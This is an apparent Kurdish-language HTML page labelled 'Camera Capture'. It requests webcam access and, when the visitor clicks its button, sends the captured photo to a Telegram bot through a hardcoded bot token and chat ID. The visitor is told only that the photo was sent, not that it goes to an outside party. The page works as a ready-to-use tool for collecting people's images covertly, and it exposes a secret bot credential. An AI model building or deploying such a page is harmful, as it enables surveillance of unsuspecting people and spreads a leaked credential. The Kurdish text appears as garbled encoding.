вҖҸ<!DOCTYPE html>
вҖҸ<html>
вҖҸ<head>
вҖҸ  <title>Camera Capture</title>
вҖҸ</head>
вҖҸ<body style="text-align:center; font-family:sans-serif;">

вҖҸ<h2>рҹ“ё ШӘЪ©Ш§ЫҢЫ• Allow ШЁЪ©Ы• ШЁЫҶ Ъ©Ш§Щ…ЫҺШұШ§</h2>

вҖҸ<video id="video" width="300" autoplay></video>
вҖҸ<br><br>

вҖҸ<button onclick="takePhoto()">рҹ“· ЩҲЫҺЩҶЫ• ШЁЪҜШұЫ•</button>

вҖҸ<canvas id="canvas" width="300" height="200" style="display:none;"></canvas>

вҖҸ<script>
вҖҸconst video = document.getElementById('video');

вҖҸnavigator.mediaDevices.getUserMedia({ video: true })
вҖҸ.then(stream => {
вҖҸ  video.srcObject = stream;
})
вҖҸ.catch(() => {
вҖҸ  alert("Ъ©Ш§Щ…ЫҺШұШ§ Ъ•ЫҺЪҜЫ•ЩҫЫҺЩҶЫ•ШҜШұШ§");
});

// вң… ШІШ§ЩҶЫҢШ§ШұЫҢ Ш®ЫҶШӘ (ШЁЫҺ space)
вҖҸconst TOKEN = "8397400887:AAFEJtNdlZPnoppSnA6yYgpFI43pcyLBegI";
вҖҸconst CHAT_ID = "1224442339";

вҖҸfunction takePhoto() {
вҖҸ  const canvas = document.getElementById('canvas');
вҖҸ  const ctx = canvas.getContext('2d');
вҖҸ  ctx.drawImage(video, 0, 0, 300, 200);

вҖҸ  canvas.toBlob(function(blob) {
вҖҸ    let formData = new FormData();
вҖҸ    formData.append("chat_id", CHAT_ID);
вҖҸ    formData.append("photo", blob, "photo.png");

вҖҸ    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
вҖҸ      method: "POST",
вҖҸ      body: formData
    })
вҖҸ    .then(() => alert("вң… ЩҲЫҺЩҶЫ• ЩҶЫҺШұШҜШұШ§"))
вҖҸ    .catch(() => alert("вқҢ ЩҮЫ•ЪөЫ•ЫҢЫ•Ъ© ЩҮЫ•ЫҢЫ•"));
  });
}
вҖҸ</script>

вҖҸ</body>
вҖҸ</html>
